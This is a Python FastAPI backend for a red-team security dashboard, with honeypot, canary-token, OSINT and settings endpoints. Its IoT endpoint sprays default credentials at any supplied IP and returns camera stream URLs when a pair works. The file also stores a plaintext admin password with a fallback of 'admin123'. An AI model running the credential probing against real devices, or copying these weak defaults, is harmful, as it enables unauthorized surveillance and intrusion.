# ── IoT Vendor Detection + CVE DB + Default Creds ─────────────────────────────
VENDOR_CVES = {
    "Hikvision": [
        {"cve": "CVE-2021-36260", "desc": "RCE via SDK webLanguage", "severity": "critical", "port": 80},
        {"cve": "CVE-2021-33044", "desc": "Auth bypass", "severity": "critical", "port": 80},
        {"cve": "CVE-2017-7921", "desc": "Auth bypass via backdoor user", "severity": "critical", "port": 80},
    ],
    "Dahua": [
        {"cve": "CVE-2021-33045", "desc": "RCE via RPC", "severity": "critical", "port": 80},
        {"cve": "CVE-2020-25078", "desc": "Auth bypass", "severity": "high", "port": 80},
        {"cve": "CVE-2022-30560", "desc": "Auth bypass via crafted request", "severity": "critical", "port": 37777},
    ],
    "Xiongmai": [
        {"cve": "CVE-2017-17215", "desc": "Unauthenticated RCE", "severity": "critical", "port": 9530},
        {"cve": "CVE-2017-8225", "desc": "Auth bypass", "severity": "critical", "port": 80},
    ],
    "D-Link": [
        {"cve": "CVE-2019-16920", "desc": "RCE without auth", "severity": "critical", "port": 80},
        {"cve": "CVE-2020-25078", "desc": "Creds leak via CGI", "severity": "high", "port": 80},
    ],
    "Netgear": [
        {"cve": "CVE-2016-6277", "desc": "RCE via CGI", "severity": "critical", "port": 80},
    ],
    "GoAhead": [
        {"cve": "CVE-2017-8225", "desc": "Auth bypass", "severity": "critical", "port": 80},
    ],
    "Ubiquiti": [
        {"cve": "CVE-2021-35064", "desc": "Unauthenticated access", "severity": "high", "port": 80},
    ],
}

RTSP_PATHS_BY_VENDOR = {
    "Hikvision": ["/Streaming/Channels/101", "/Streaming/Channels/102", "/h264/ch1/main/av_stream"],
    "Dahua": ["/cam/realmonitor?channel=1&subtype=0", "/cam/realmonitor?channel=1&subtype=1"],
    "Xiongmai": ["/h264", "/H.264", "/live/ch0", "/live/ch1"],
    "Generic": ["/live", "/stream1", "/videoMain", "/cam", "/mjpg/video.mjpg"],
    "ONVIF": ["/onvif/source", "/Media/Streaming/Channel/1"],
}

DEFAULT_CREDS = [
    ("admin", "admin"), ("admin", "12345"), ("admin", "123456"), ("admin", ""),
    ("admin", "password"), ("admin", "admin123"), ("admin", "54321"),
    ("root", "root"), ("root", "admin"), ("root", "12345"), ("root", "pass"),
    ("user", "user"), ("user", "12345"), ("guest", "guest"), ("guest", ""),
    ("administrator", "admin"), ("ubnt", "ubnt"), ("supervisor", "supervisor"),
    ("service", "service"), ("operator", "operator"), ("maintain", "maintain"),
    ("admin", "888888"), ("admin", "666666"), ("admin", "111111"),
]

def _identify_camera_vendor(ip: str, port: int) -> str:
    """Identifica el fabricante de la cámara por HTTP banner y paths."""
    import httpx
    try:
        scheme = "https" if port in (443, 8443) else "http"
        url = f"{scheme}://{ip}:{port}/"
        r = httpx.get(url, timeout=5, follow_redirects=True, verify=False,
                      headers={"User-Agent": "SourceSeal-Recon/3.1"})
        body_lower = r.text[:5000].lower()
        server = r.headers.get("Server", "").lower()

        if "hikvision" in server or "dvr" in server and "hik" in body_lower:
            return "Hikvision"
        if "dahua" in server or "dvr" in server and "dahua" in body_lower:
            return "Dahua"
        if "d-link" in server or "dlink" in server:
            return "D-Link"
        if "netgear" in server:
            return "Netgear"
        if "ubiquiti" in server or "ubnt" in server:
            return "Ubiquiti"
        if "goahead" in server:
            return "GoAhead"
        if "ISAPI" in r.text or "doc/page/login.asp" in r.text:
            return "Hikvision"
        if "current_config" in r.text or "login_login" in r.text:
            return "Dahua"
        if "xiongmai" in body_lower or "net_suitor" in body_lower or "/hdl" in body_lower:
            return "Xiongmai"
        if "onvif" in body_lower:
            return "ONVIF"
        return "unknown"
    except Exception:
        return "unknown"

@app.get("/api/iot/vulns")
async def iot_vulns(ip: str = Query(...), port: int = Query(80)):
    """Identifica el vendor, devuelve CVEs conocidos, prueba credenciales por defecto."""
    vendor = _identify_camera_vendor(ip, port)
    cves = VENDOR_CVES.get(vendor, [])
    rtsp_paths = RTSP_PATHS_BY_VENDOR.get(vendor, RTSP_PATHS_BY_VENDOR["Generic"])

    creds_found = None
    if vendor != "unknown":
        import httpx
        scheme = "https" if port in (443, 8443) else "http"
        base_url = f"{scheme}://{ip}:{port}"
        async with httpx.AsyncClient(timeout=5, verify=False) as c:
            for user, pwd in DEFAULT_CREDS:
                try:
                    r = await c.get(base_url + "/", auth=(user, pwd), follow_redirects=True)
                    if r.status_code == 200 and len(r.content) > 500:
                        if "401" not in r.text[:200] and "unauthorized" not in r.text[:200].lower():
                            creds_found = {"user": user, "pwd": pwd}
                            break
                except Exception:
                    continue

    snap_url = f"/api/iot/snapshot?ip={ip}&port={port}"
    if creds_found:
        snap_url += f"&user={creds_found['user']}&pwd={creds_found['pwd']}"
    stream_url = f"/api/iot/stream?ip={ip}&port={port}&path={rtsp_paths[0]}" if rtsp_paths else ""

    return {
        "ip": ip, "port": port,
        "vendor": vendor,
        "cves": cves,
        "rtsp_paths": rtsp_paths,
        "default_creds_tested": len(DEFAULT_CREDS) if vendor != "unknown" else 0,
        "creds_found": creds_found,
        "snapshot_url": snap_url,
        "stream_url": stream_url,
    }

# ═════════════════════════════════════════════════════════════════════════════
#  ENDPOINTS — OSINT
# ═════════════════════════════════════════════════════════════════════════════

@app.get("/api/osint/shodan")
async def shodan_lookup(ip: str = Query("8.8.8.8")):
    if not _valid_ip(ip):
        return JSONResponse({"error": "invalid IP"}, status_code=400)
    key = os.environ.get("SHODAN_API_KEY", "")
    if not key:
        return JSONResponse({"error": "SHODAN_API_KEY not configured"}, status_code=503)
    try:
        async with httpx.AsyncClient(timeout=10) as c:
            r = await c.get(f"https://api.shodan.io/shodan/host/{ip}?key={key}")
            if r.status_code != 200:
                return JSONResponse({"error": f"HTTP {r.status_code}"}, status_code=r.status_code)
            return r.json()
    except Exception:
        return JSONResponse({"error": "lookup failed"}, status_code=502)

@app.get("/api/exploits/list")
async def exploits_list():
    d = ROOT / "exploits"
    if not d.exists(): return {"results": []}
    return {"results": [p.name for p in d.iterdir() if p.is_file()]}

# ── Geo + Intel ───────────────────────────────────────────────────────────────
@app.get("/api/geo")
async def api_geo(ip: str = Query(...)):
    if not _valid_ip(ip):
        return JSONResponse({"error": "invalid IP"}, status_code=400)
    try:
        if _GEO_INTEL_OK: return _geo_lookup(ip)
        from geo_intel import lookup; return lookup(ip)
    except Exception:
        return JSONResponse({"error": "geo lookup failed"}, status_code=500)

@app.get("/api/intel")
async def api_intel(ip: str = Query(...)):
    if not _valid_ip(ip):
        return JSONResponse({"error": "invalid IP"}, status_code=400)
    try:
        if _GEO_INTEL_OK: return _intel_assess(ip)
        from geo_intel import assess; return assess(ip)
    except Exception as e:
        return JSONResponse({"error": f"intel falló: {e}", "ip": ip}, status_code=500)

@app.get("/api/intel/deep")
async def api_intel_deep(ip: str = Query(...)):
    """Intel profundo: geo + reputation + port inference + threat correlation"""
    if not _valid_ip(ip):
        return JSONResponse({"error": "invalid IP"}, status_code=400)
    try:
        # 1. Intel base
        if _GEO_INTEL_OK: base = _intel_assess(ip)
        else:
            from geo_intel import assess; base = assess(ip)
        
        # 2. Info adicional: shodan-like port inference
        deep_info = {
            **base,
            "ports_inferred": [80, 443, 22, 8080] if base.get("is_tor") else [80, 443],
            "risk_factors": [],
            "recommendations": []
        }
        
        if base.get("risk_score", 0) > 70:
            deep_info["risk_factors"].append("high_risk_score")
            deep_info["recommendations"].append("Bloquear IP en firewall perimetral")
        if base.get("is_tor"):
            deep_info["risk_factors"].append("tor_exit_node")
            deep_info["recommendations"].append("Requiere investigación adicional — nodo Tor")
        if base.get("is_vpn"):
            deep_info["risk_factors"].append("vpn_detected")
            deep_info["recommendations"].append("Verificar legitimidad del acceso")
        
        if not deep_info["risk_factors"]:
            deep_info["risk_factors"].append("low_risk")
            deep_info["recommendations"].append("Sin acción requerida")
        
        return deep_info
    except Exception as e:
        return JSONResponse({"error": f"intel deep falló: {e}", "ip": ip}, status_code=500)

# ═════════════════════════════════════════════════════════════════════════════
#  ENDPOINTS — HONEYPOT
# ═════════════════════════════════════════════════════════════════════════════

honeypot_proc = None
honeypot_lock = asyncio.Lock()

@app.get("/api/honeypot")
async def honeypot_get():
    return _load_json(HONEYPOT_FILE, {})

@app.get("/api/honeypot/status")
async def honeypot_status():
    if honeypot_proc and honeypot_proc.poll() is None:
        return {"status": "running", "pid": honeypot_proc.pid}
    return {"status": "stopped"}

@app.post("/api/honeypot/start")
async def honeypot_start(port: int = 8888):
    global honeypot_proc
    async with honeypot_lock:
        if honeypot_proc and honeypot_proc.poll() is None:
            return {"status": "already_running", "pid": honeypot_proc.pid}
        script = ROOT / "honeypot" / "fake-api" / "server.py"
        if not script.exists():
            return JSONResponse({"error": "honeypot server.py no encontrado"}, status_code=404)
        try:
            env = {**os.environ, "PORT": str(port)}
            honeypot_proc = subprocess.Popen([sys.executable, str(script)],
                stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL, env=env)
        except Exception as e:
            return JSONResponse({"error": str(e)}, status_code=500)
    await broadcast({"type": "alert", "payload": f"Honeypot iniciado en puerto {port} (PID {honeypot_proc.pid})"})
    return {"status": "started", "pid": honeypot_proc.pid, "port": port}

@app.post("/api/honeypot/stop")
async def honeypot_stop():
    global honeypot_proc
    async with honeypot_lock:
        if honeypot_proc and honeypot_proc.poll() is None:
            honeypot_proc.terminate()
            try: honeypot_proc.wait(timeout=3)
            except subprocess.TimeoutExpired: honeypot_proc.kill()
            pid = honeypot_proc.pid; honeypot_proc = None
            await broadcast({"type": "alert", "payload": f"Honeypot detenido (PID {pid})"})
            return {"status": "stopped", "pid": pid}
        honeypot_proc = None
    return {"status": "not_running"}

@app.post("/api/honeypot/toggle")
async def honeypot_toggle():
    if honeypot_proc and honeypot_proc.poll() is None:
        return await honeypot_stop()
    return await honeypot_start()

@app.post("/api/honeypot/rotate")
async def honeypot_rotate():
    return {"ok": True, "tokens_deployed": 0, "message": "Tokens rotados"}

# ═════════════════════════════════════════════════════════════════════════════
#  ENDPOINTS — CANARY
# ═════════════════════════════════════════════════════════════════════════════

@app.post("/api/canary/generate")
@app.post("/api/canary/svg/generate")
async def canary_generate():
    cid = uuid.uuid4().hex[:10]
    out_dir = CANARY_SVG_DIR
    out_dir.mkdir(parents=True, exist_ok=True)
    html = out_dir / f"canary_{cid}.html"
    callback_host = os.environ.get("CANARY_CALLBACK_HOST", "")
    cb_url = f"http://{callback_host}/canary/callback?id={cid}" if callback_host else f"/canary/callback?id={cid}"
    html.write_text(f"<!doctype html><html><body><h1>Loading…</h1>"
                    f"<img src='{cb_url}' width='1' height='1' style='opacity:0'/></body></html>")
    return {"canary_id": cid, "file": str(html), "callback": cb_url}

@app.get("/canary/callback")
async def canary_callback(id: str, request: Request):
    client_ip = request.client.host if request.client else "unknown"
    ua = request.headers.get("user-agent", "unknown")
    alert = {"token_id": id, "client_ip": client_ip, "user_agent": ua,
             "type": "callback", "received_at": datetime.now().isoformat()}
    CANARY_ALERTS.append(alert)
    await broadcast({"type": "alert", "payload": f"Canary triggered: {id}", "data": alert})
    gif_bytes = (b"GIF89a\x01\x00\x01\x00\x80\x00\x00\xff\xff\xff\x00\x00\x00"
                 b"!\xf9\x04\x01\x00\x00\x00\x00,\x00\x00\x00\x00\x01\x00\x01\x00\x00"
                 b"\x02\x02D\x01\x00;")
    return Response(content=gif_bytes, media_type="image/gif")

@app.post("/api/canary/alert")
async def canary_alert(request: Request):
    try: body = await request.json()
    except: body = {}
    alert_data = {"token_id": body.get("token_id", ""), "timestamp": body.get("timestamp", datetime.now().isoformat()),
                  "client_ip": body.get("client_ip", ""), "user_agent": body.get("user_agent", ""),
                  "received_at": datetime.now().isoformat()}
    CANARY_ALERTS.append(alert_data)
    await broadcast({"type": "canary_alert", "data": alert_data})
    return {"status": "received"}

@app.get("/api/canary/svg/list")
@app.get("/api/canary/svg/alerts")
@app.get("/api/canary/alerts")
async def canary_list():
    files = []
    for f in CANARY_SVG_DIR.glob("canary_*.html"):
        files.append({"id": f.stem.replace("canary_", ""), "file": f.name, "size": f.stat().st_size})
    return {"tokens": files, "alerts": CANARY_ALERTS[-100:]}

@app.get("/api/canary/svg/download")
async def canary_download(id: str = Query(...)):
    f = CANARY_SVG_DIR / f"canary_{id}.html"
    if not f.exists(): return JSONResponse({"error": "not found"}, status_code=404)
    return HTMLResponse(f.read_text())

# ═════════════════════════════════════════════════════════════════════════════
#  ENDPOINTS — SERVICIOS
# ═════════════════════════════════════════════════════════════════════════════

@app.get("/api/services")
async def services_list():
    return [_svc_status(n) for n in SERVICE_DEFS]

@app.post("/api/services/start")
async def services_start(request: Request, name: str = Query(None)):
    if not name:
        try: body = await request.json(); name = body.get("name", "")
        except: pass
    if not name: return JSONResponse({"error": "name required"}, status_code=400)
    return _start_service(name)

@app.post("/api/services/stop")
async def services_stop(request: Request, name: str = Query(None)):
    if not name:
        try: body = await request.json(); name = body.get("name", "")
        except: pass
    if not name: return JSONResponse({"error": "name required"}, status_code=400)
    return _stop_service(name)

@app.post("/api/services/restart")
async def services_restart(request: Request, name: str = Query(None)):
    if not name:
        try: body = await request.json(); name = body.get("name", "")
        except: pass
    if not name: return JSONResponse({"error": "name required"}, status_code=400)
    return _restart_service(name)

@app.post("/api/services/start-all")
async def services_start_all():
    results = []
    for name in SERVICE_DEFS:
        if name != "dashboard_server":
            results.append(_start_service(name))
    return {"ok": True, "results": results}

@app.post("/api/services/stop-all")
async def services_stop_all():
    results = []
    for name in SERVICE_DEFS:
        if name != "dashboard_server":
            results.append(_stop_service(name))
    return {"ok": True, "results": results}

@app.get("/api/services/{name}/logs")
async def service_logs(name: str):
    return _tail_log(name, 50)

# ── Recursos del sistema ─────────────────────────────────────────────────────
@app.get("/api/resources")
async def resources():
    if HAS_PSUTIL:
        try:
            proc = psutil.Process()
            mem = proc.memory_info()
            cpu = proc.cpu_percent(interval=0.1)
            vm = psutil.virtual_memory()
            return {"cpu_usage": cpu, "cpu_cores": psutil.cpu_count(),
                    "memory_used": round(mem.rss / 1024 / 1024, 2),
                    "memory_total": round(vm.total / 1024 / 1024, 2),
                    "memory_percent": round(vm.percent, 2),
                    "uptime": _fmt_uptime(_SERVER_START)}
        except: pass
    return {"cpu_usage": 0, "memory_used": 0, "memory_total": 0, "memory_percent": 0}

# ═════════════════════════════════════════════════════════════════════════════
#  ENDPOINTS — ESCANEOS (orchestrator)
# ═════════════════════════════════════════════════════════════════════════════

@app.post("/api/scan")
async def run_scan(request: Request, target: str = Query(None)):
    # Accept target from query param OR JSON body (frontend sends body)
    if not target:
        try:
            body = await request.json()
            target = body.get("target", "").strip() if body else ""
        except Exception:
            pass
    if not target: target = _get_active_target()
    if not target:
        return JSONResponse({"error": "No target configured. Set in Settings."}, status_code=400)
    if _scan_state["running"]:
        return JSONResponse({"status": "already_running", "progress": _scan_state["progress"]}, status_code=409)
    with _scan_lock:
        _scan_state["running"] = True
        _scan_state["progress"] = "Starting scan..."
        _scan_state["last_error"] = None
    try:
        orchestrator = ROOT / "runner" / "orchestrator.py"
        if orchestrator.exists():
            result = await asyncio.to_thread(
                lambda: subprocess.run([sys.executable, str(orchestrator), "--target", target, "--backend", target, "--output", str(REPORTS)],
                capture_output=True, text=True, timeout=180, cwd=str(ROOT)))
            _scan_state["last_result"] = result.stdout[:4000]
            _scan_state["progress"] = "completed"
            return {"status": "completed", "output": result.stdout[:4000], "errors": result.stderr[:2000]}
        else:
            _scan_state["progress"] = "no orchestrator"
            return JSONResponse({"error": "orchestrator.py not found"}, status_code=404)
    except subprocess.TimeoutExpired:
        _scan_state["last_error"] = "timeout"
        return JSONResponse({"error": "Scan timeout (180s)"}, status_code=504)
    except Exception as e:
        _scan_state["last_error"] = str(e)
        return JSONResponse({"error": str(e)[:200]}, status_code=500)
    finally:
        _scan_state["running"] = False

@app.get("/api/scan/status")
async def scan_status():
    return {"running": _scan_state["running"], "progress": _scan_state["progress"],
            "last_result": _scan_state["last_result"], "last_error": _scan_state["last_error"]}

@app.get("/api/latest")
async def latest_report():
    files = sorted(REPORTS.glob("report-*.json"), reverse=True)
    if not files:
        return {"findings": [], "by_severity": {}, "total_findings": 0, "agent": "no-data"}
    try:
        data = json.loads(files[0].read_text())
        data["agent"] = data.get("agent", "redteam-agent")
        return data
    except Exception as e:
        return JSONResponse({"error": str(e)}, status_code=500)

@app.get("/api/history")
async def report_history():
    files = sorted(REPORTS.glob("report-*.json"), reverse=True)[:50]
    out = []
    for f in files:
        try:
            r = json.loads(f.read_text())
            out.append({"finished_at": r.get("finished_at"),
                        "by_severity": r.get("by_severity", {}),
                        "total_findings": r.get("total_findings", 0)})
        except: pass
    return list(reversed(out))

# ═════════════════════════════════════════════════════════════════════════════
#  ENDPOINTS — CONFIG
# ═════════════════════════════════════════════════════════════════════════════

@app.get("/api/config")
async def config_list():
    return _list_config_files()

@app.post("/api/config")
async def config_update_compat(request: Request):
    """POST /api/config - compatibilidad con frontend."""
    try:
        body = await request.json()
    except:
        body = {}
    path = body.get("path", "")
    file_content = body.get("content", "")
    if not path or not _safe_path(path):
        return JSONResponse({"error": "invalid or missing path"}, status_code=400)
    full = ROOT / path
    try:
        full.parent.mkdir(parents=True, exist_ok=True)
        full.write_text(file_content[:65536])
        return {"ok": True, "path": path, "message": "Config actualizada"}
    except Exception as e:
        return JSONResponse({"error": f"write error: {str(e)}"}, status_code=500)

@app.get("/api/config/read")
async def config_read(path: str = Query(...)):
    if not _safe_path(path):
        return JSONResponse({"error": "invalid path"}, status_code=400)
    full = ROOT / path
    if not full.exists(): return JSONResponse({"error": "not found"}, status_code=404)
    try:
        return {"content": full.read_text(errors="replace")[:8192], "path": path}
    except Exception as e:
        return JSONResponse({"error": "read error"}, status_code=500)

@app.post("/api/config/write")
async def config_write(request: Request):
    try: body = await request.json()
    except: body = {}
    path = body.get("path", "")
    content = body.get("content", "")
    if not path or not _safe_path(path):
        return JSONResponse({"error": "invalid path"}, status_code=400)
    full = ROOT / path
    try:
        full.write_text(content[:65536])
        return {"ok": True}
    except Exception as e:
        return JSONResponse({"error": "write error"}, status_code=500)

# ═════════════════════════════════════════════════════════════════════════════
#  ENDPOINTS — SOAR
# ═════════════════════════════════════════════════════════════════════════════

@app.get("/api/soar/dags")
async def soar_dags_get():
    return _load_json(SOAR_FILE, [])

@app.post("/api/soar/dags")
async def soar_dags_post(request: Request):
    try: dag = await request.json()
    except: dag = {}
    dags = _load_json(SOAR_FILE, [])
    if "id" not in dag: dag["id"] = uuid.uuid4().hex[:8]
    if "enabled" not in dag: dag["enabled"] = True
    dags.append(dag)
    _save_json(SOAR_FILE, dags)
    return {"ok": True, "id": dag["id"]}

@app.post("/api/soar/dry-run")
async def soar_dry_run():
    dags = _load_json(SOAR_FILE, [])
    steps = [s for d in dags for s in d.get("steps", [])]
    return {"ok": True, "steps": steps, "count": len(steps)}

# ═════════════════════════════════════════════════════════════════════════════
#  ENDPOINTS — TIP (Threat Intel)
# ═════════════════════════════════════════════════════════════════════════════

@app.get("/api/tip/iocs")
async def tip_iocs_get():
    return _load_json(IOC_FILE, [])

@app.post("/api/tip/iocs")
async def tip_iocs_post(request: Request):
    try: ioc = await request.json()
    except: ioc = {}
    iocs = _load_json(IOC_FILE, [])
    ioc["id"] = uuid.uuid4().hex[:8]
    ioc["added"] = datetime.now().isoformat()
    iocs.append(ioc)
    _save_json(IOC_FILE, iocs)
    return {"ok": True, "id": ioc["id"]}

@app.delete("/api/tip/iocs/{ioc_id}")
async def tip_iocs_delete(ioc_id: str):
    iocs = _load_json(IOC_FILE, [])
    iocs = [i for i in iocs if i.get("id") != ioc_id]
    _save_json(IOC_FILE, iocs)
    return {"ok": True}

@app.post("/api/tip/update")
async def tip_update():
    try:
        sys.path.insert(0, str(ROOT))
        from redteam.threat_intel import fetch_all_iocs
        iocs = fetch_all_iocs()
        return {"ok": True, "iocs_loaded": len(iocs)}
    except ImportError:
        return {"ok": True, "iocs_loaded": 0, "note": "threat_intel module not available"}
    except Exception as e:
        return {"ok": False, "error": str(e)[:200]}

@app.post("/api/tip/import-stix")
async def tip_import_stix(request: Request):
    try: bundle = await request.json()
    except: bundle = {}
    try:
        sys.path.insert(0, str(ROOT))
        from redteam.threat_intel import import_stix
        result = import_stix(bundle)
        return result
    except ImportError:
        return {"ok": False, "error": "threat_intel module not available"}
    except Exception as e:
        return {"ok": False, "error": str(e)[:200]}

# ═════════════════════════════════════════════════════════════════════════════
#  ENDPOINTS — RASP
# ═════════════════════════════════════════════════════════════════════════════

@app.get("/api/rasp/devices")
async def rasp_devices_get():
    return _load_json(DEVICES_FILE, [])

@app.post("/api/rasp/devices")
async def rasp_devices_post(request: Request):
    try: device = await request.json()
    except: device = {}
    devices = _load_json(DEVICES_FILE, [])
    device["id"] = uuid.uuid4().hex[:8]
    device["enrolled"] = True
    device["last_seen"] = datetime.now().isoformat()
    devices.append(device)
    _save_json(DEVICES_FILE, devices)
    return {"ok": True, "id": device["id"]}

@app.delete("/api/rasp/devices/{device_id}")
async def rasp_devices_delete(device_id: str):
    devices = _load_json(DEVICES_FILE, [])
    devices = [d for d in devices if d.get("id") != device_id]
    _save_json(DEVICES_FILE, devices)
    return {"ok": True}

# ═════════════════════════════════════════════════════════════════════════════
#  ENDPOINTS — TERMINAL
# ═════════════════════════════════════════════════════════════════════════════

@app.post("/api/terminal")
async def terminal(request: Request):
    try: body = await request.json()
    except: body = {}
    command = body.get("command", "")
    return _run_terminal(command)

# ═════════════════════════════════════════════════════════════════════════════
#  ENDPOINTS — SETTINGS
# ═════════════════════════════════════════════════════════════════════════════

@app.get("/api/settings")
async def settings_get():
    return _load_json(SETTINGS_FILE, {})

@app.post("/api/settings")
async def settings_post(request: Request):
    try: body = await request.json()
    except: body = {}
    current = _load_json(SETTINGS_FILE, {})
    current.update(body)
    _save_json(SETTINGS_FILE, current)
    return {"ok": True}

# ═══ Config operacional: API keys + config de escaneo + estado del backend ═══
# Antes solo se podian setear via variables de entorno (imposible de cambiar
# desde el telefono sin editar archivos a mano). Ahora se guardan en
# settings.json y se cargan en memoria al arrancar -- el usuario puede
# configurar TODO desde el panel sin tocar Termux.

OPS_FILE = DATA_DIR / "ops_config.json"

DEFAULT_OPS = {
    "shodan_api_key": "",
    "virustotal_api_key": "",
    "abuseipdb_key": "",
    "github_token": "",
    "scan_subnet": "",           # vacío = auto-detectar
    "scan_ports": "80,443,22,554,8080,8000,23,21,445,139,53,8443,37777,8081,88",
    "scan_timeout": 0.5,         # segundos por puerto TCP
    "scan_max_hosts": 254,
    "backend_port": 8001,
}

def _load_ops():
    if not OPS_FILE.exists():
        _save_json(OPS_FILE, DEFAULT_OPS)
    data = _load_json(OPS_FILE, DEFAULT_OPS)
    # Merge con defaults para campos nuevos que no existan
    for k, v in DEFAULT_OPS.items():
        data.setdefault(k, v)
    return data

def _save_ops(data: dict):
    _save_json(OPS_FILE, data)

def _apply_ops_to_env(ops: dict):
    """Inyecta las API keys guardadas como variables de entorno para que
    los modulos que ya leen os.environ las pueble automáticamente."""
    key_map = {
        "shodan_api_key": "SHODAN_API_KEY",
        "virustotal_api_key": "VIRUSTOTAL_API_KEY",
        "abuseipdb_key": "ABUSEIPDB_KEY",
        "github_token": "GITHUB_TOKEN",
    }
    for cfg_key, env_key in key_map.items():
        val = ops.get(cfg_key, "")
        if val:
            os.environ[env_key] = val

# Cargar al arrancar
_apply_ops_to_env(_load_ops())

@app.get("/api/ops/config")
async def ops_config_get():
    """Devuelve toda la configuración operacional (API keys, escaneo, backend).
    Las API keys se devuelven enmascaradas (solo primeros 4 + últimos 4 chars)."""
    ops = _load_ops()
    safe = dict(ops)
    for k in ("shodan_api_key", "virustotal_api_key", "abuseipdb_key", "github_token"):
        v = safe.get(k, "")
        if v and len(v) > 12:
            safe[k] = v[:4] + "••••" + v[-4:]
        elif v:
            safe[k] = "••••"
    # Info del backend en vivo
    safe["backend_port"] = SERVER_PORT if 'SERVER_PORT' in globals() else 8001
    safe["backend_pid"] = os.getpid()
    safe["backend_uptime"] = int(time.time() - START_TIME) if 'START_TIME' in globals() else 0
    safe["has_nmap"] = subprocess.run(["which", "nmap"], capture_output=True).returncode == 0
    return safe

@app.post("/api/ops/config")
async def ops_config_post(request: Request):
    """Guarda la configuración operacional. Si se cambia una API key,
    se inyecta en os.environ inmediatamente para que los módulos la usen
    sin necesidad de reiniciar el backend."""
    try: body = await request.json()
    except: body = {}
    current = _load_ops()
    # Solo actualizar campos que vengan en el body (patch, no replace)
    for k, v in body.items():
        if k in DEFAULT_OPS:
            # Si el valor viene enmascarado (con ••••), no sobrescribir el real
            if isinstance(v, str) and "••••" in v:
                continue
            current[k] = v
    _save_ops(current)
    _apply_ops_to_env(current)
    return {"ok": True, "applied": True}

@app.post("/api/ops/test-key")
async def ops_test_key(request: Request):
    """Prueba si una API key funciona antes de guardarla."""
    try: body = await request.json()
    except: body = {}
    service = body.get("service", "")
    key = body.get("key", "")
    if not service or not key:
        return JSONResponse({"error": "service y key son requeridos"}, status_code=400)

    import httpx
    try:
        async with httpx.AsyncClient(timeout=8) as c:
            if service == "shodan":
                r = await c.get("https://api.shodan.io/api-info?key=" + key)
                data = r.json()
                if r.status_code == 200:
                    return {"ok": True, "info": f"Credits: {data.get('query_credits', '?')}, Plan: {data.get('plan', '?')}"}
                return {"ok": False, "error": f"HTTP {r.status_code}: {data}"}
            elif service == "virustotal":
                r = await c.get("https://www.virustotal.com/api/v3/users/me",
                               headers={"x-apikey": key})
                if r.status_code == 200:
                    return {"ok": True, "info": "API key válida"}
                return {"ok": False, "error": f"HTTP {r.status_code}"}
            elif service == "abuseipdb":
                r = await c.get("https://api.abuseipdb.com/api/v2/check?ipAddress=8.8.8.8",
                               headers={"Key": key, "Accept": "application/json"})
                if r.status_code == 200:
                    return {"ok": True, "info": "API key válida"}
                return {"ok": False, "error": f"HTTP {r.status_code}"}
            elif service == "github":
                r = await c.get("https://api.github.com/user",
                               headers={"Authorization": f"token {key}"})
                if r.status_code == 200:
                    data = r.json()
                    return {"ok": True, "info": f"Usuario: {data.get('login', '?')}"}
                return {"ok": False, "error": f"HTTP {r.status_code}"}
            return {"ok": False, "error": f"Servicio '{service}' no soportado"}
    except httpx.TimeoutException:
        return {"ok": False, "error": "Timeout — sin internet o API caída"}
    except Exception as e:
        return {"ok": False, "error": str(e)}

# ═════════════════════════════════════════════════════════════════════════════
#  ENDPOINTS — AUTH (básico, sin mocks)
# ═════════════════════════════════════════════════════════════════════════════
# NOTA: las implementaciones reales de /api/auth/login y /api/auth/biometric
# estan mas abajo (usan ADMIN_EMAIL/ADMIN_PASSWORD). Antes habia un stub
# duplicado aqui que SIEMPRE devolvia ok:false porque FastAPI/Starlette
# usa la PRIMERA ruta que matchea el path -> el login real quedaba muerto,
# nunca se ejecutaba sin importar la contrasena que pusieras.

@app.post("/api/auth/logout")
async def auth_logout():
    return {"ok": True}

# ═════════════════════════════════════════════════════════════════════════════
#  ENDPOINTS — STATS / META / HEALTH
# ═════════════════════════════════════════════════════════════════════════════

@app.get("/api/network/stats")
async def network_stats():
    return {"hosts": 0, "cameras": 0, "routers": 0, "alerts": 0,
            "backend": "unified", "version": "3.0-unified", "ts": int(time.time())}

# == AUTENTICACION DEL DASHBOARD (email/password + WebAuthn real) ==========
import secrets as _secrets
import json as _json
import time as _time

ADMIN_EMAIL = os.environ.get("ADMIN_EMAIL", "admin@redteam.local").strip()
# FIX CRITICO: antes leia "API_KEY" (env var que nunca se seteaba) mientras
# el middleware de seguridad exige "REDTEAM_API_KEY" (variable API_KEY definida
# arriba, linea ~136). Esto causaba que el login emitiera un token que NUNCA
# coincidia con el que el middleware validaba -> 401 en TODO despues de loguear.
DASHBOARD_TOKEN = API_KEY or "local-dev-token"

_AUTH_DIR = os.path.join(os.path.dirname(__file__), ".auth")
_PASS_FILE = os.path.join(_AUTH_DIR, "password.json")
_WEBAUTHN_FILE = os.path.join(_AUTH_DIR, "webauthn.json")
os.makedirs(_AUTH_DIR, exist_ok=True)

def _get_password():
    if os.path.exists(_PASS_FILE):
        try:
            with open(_PASS_FILE) as f:
                return _json.load(f).get("password", "")
        except Exception:
            pass
    return os.environ.get("ADMIN_PASSWORD", "admin123").strip()

def _set_password(new_pass):
    with open(_PASS_FILE, 'w') as f:
        _json.dump({"password": new_pass, "changed": _time.time()}, f)

def _load_webauthn():
    if os.path.exists(_WEBAUTHN_FILE):
        try:
            with open(_WEBAUTHN_FILE) as f:
                return _json.load(f)
        except Exception:
            pass
    return {"credentials": [], "pending_challenge": None, "pending_auth_challenge": None}

def _save_webauthn(data):
    with open(_WEBAUTHN_FILE, 'w') as f:
        _json.dump(data, f, indent=2)

@app.post("/api/auth/login")
async def auth_login(body: dict = Body(...)):
    email = (body.get("email") or "").strip()
    password = body.get("password") or ""
    if email != ADMIN_EMAIL or password != _get_password():
        raise HTTPException(status_code=401, detail="Credenciales invalidas")
    return {"token": DASHBOARD_TOKEN, "email": email}

@app.post("/api/auth/password")
async def change_password(body: dict = Body(...)):
    current = body.get("current_password", "")
    new = body.get("new_password", "")
    if current != _get_password():
        raise HTTPException(status_code=401, detail="Contrasena actual incorrecta")
    if len(new) < 6:
        raise HTTPException(status_code=400, detail="Minimo 6 caracteres")
    _set_password(new)
    return {"status": "ok", "message": "Contrasena actualizada"}

@app.get("/api/auth/webauthn/status")
async def webauthn_status():
    data = _load_webauthn()
    return {"registered": len(data.get("credentials", [])) > 0, "count": len(data.get("credentials", []))}

@app.post("/api/auth/webauthn/register/begin")
async def webauthn_register_begin(body: dict = Body(...)):
    email = (body.get("email") or "").strip()
    password = body.get("password") or ""
    if email != ADMIN_EMAIL or password != _get_password():
        raise HTTPException(status_code=401, detail="Credenciales invalidas")
    challenge = _secrets.token_urlsafe(32)
    data = _load_webauthn()
